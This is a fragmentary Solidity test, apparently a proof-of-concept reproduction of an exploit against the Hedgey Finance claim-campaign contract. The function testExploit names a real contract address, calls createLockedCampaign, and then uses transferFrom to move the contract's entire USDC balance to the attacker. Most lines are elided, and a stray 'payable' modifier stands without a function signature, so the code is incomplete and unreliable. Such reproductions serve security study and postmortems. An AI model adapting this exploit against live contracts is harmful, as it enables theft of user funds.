...
contract HedgeyFinance is Test {
    ...
    // HedgeyFinance
    IClaimCampaigns private constant _HedgeyFinance = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);
    ...
    function testExploit() public {
        ...
        USDC.transferFrom(address(_HedgeyFinance), address(this), HedgeyFinance_balance);
        ...
        payable
    {
        ...
        _HedgeyFinance.createLockedCampaign(campaign_id, campaign, claimLockup, donation);
